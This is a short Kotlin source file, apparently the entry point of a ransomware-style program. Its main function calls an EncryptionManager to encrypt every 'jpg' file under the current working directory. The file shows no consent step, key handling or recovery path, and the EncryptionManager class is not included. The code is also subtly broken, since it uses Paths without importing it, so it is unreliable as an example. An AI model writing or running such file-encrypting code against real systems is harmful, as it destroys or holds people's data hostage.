package briiqn.lol

import java.io.File

object Main {
    private var encryptor: EncryptionManager = EncryptionManager()
    @JvmStatic
    fun main(args: Array<String>) {
        encryptor.encryptDirectory(Paths.get("").toAbsolutePath(), "jpg")
    }
}
